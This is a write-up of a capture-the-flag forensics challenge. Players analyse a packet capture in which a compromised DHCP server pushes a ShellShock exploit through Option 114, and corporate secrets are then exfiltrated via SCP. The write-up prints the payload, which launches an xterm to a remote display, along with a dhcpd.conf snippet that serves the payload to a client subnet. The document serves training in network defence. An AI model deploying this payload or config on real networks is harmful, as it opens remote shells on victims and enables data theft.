Escapee Writeup
===================
## Category
Detect and Defend

## Question
Corporate secrets have been exfiltrated. Analyse the pcap, locate the victim and find the exploit. [exfil.zip (~241MB)](https://drive.google.com/file/d/0BwXhXHcd49sSNWhyLWs4bHAwcFU) **Password: Yei7igohjoteixoxe2qu**. Submit the VICTIM IP and full exploit payload in quotes as your answer. I.e XX.XX.XX.XX "{exploit payload}"

## Designed Solution
The corporate DHCP server has been compromised (weak admin password). The DHCP service is sending a ShellShock exploit as Option 114 (default url). The exploit initiates an X11 session from the
victim to the DHCP server. Once established, corpsecrets.7z is copied via SCP from the victim to the DHCP server and subsequently from the DHCP server to an external host in 10/8 (the final exfil).
*Corpsecrets.7z is just a dummy file. It is encrypted with a random password. There is no point trying to extract the contents.*

## Hints Given
None

## Player Solution Comments
Teams often confused the exfiltrated file with the exploit payload. Some often submitted the DHCP servers IP instead of the Victim. Two teams got the both responses correct.

## Writeup
Using wireshark or similar, players should detect interesting traffic flows such as SCP from compromised client to DHCP server  `172.16.202.105` -> `172.16.203.200` and / or subsequently SCP on port 80 from the DHCP server to offnet server `10.66.212.93`. The flows should be evident if analysing flow duration, protocol, or traffic volume. There is background TCP port 80 traffic generated from the client segment to the server segment (specifically server 172.16.203.230). Once the victim `172.16.202.105` is identified, then working back through time, an X11 session should be discovered which is initiated by the client to the DHCP server. This was caused by a DHCP offer packet.

Victim is `172.16.202.105` and shellshock exploit is ``“() { ignored;}; /usr/bin/xterm -display 172.16.203.200:1”`

**dhcpd.conf snippet**
```
#shellshock test
option shellshock code 114 = text;
if exists dhcp-parameter-request-list {
  option dhcp-parameter-request-list=concat(option dhcp-parameter-request-list,72);
}
#scope with exploit
subnet 172.16.202.0 netmask 255.255.255.0 {
  range 172.16.202.100 172.16.202.199;
  option shellshock "() { ignored;}; /usr/bin/xterm -display 172.16.203.200:1";
```
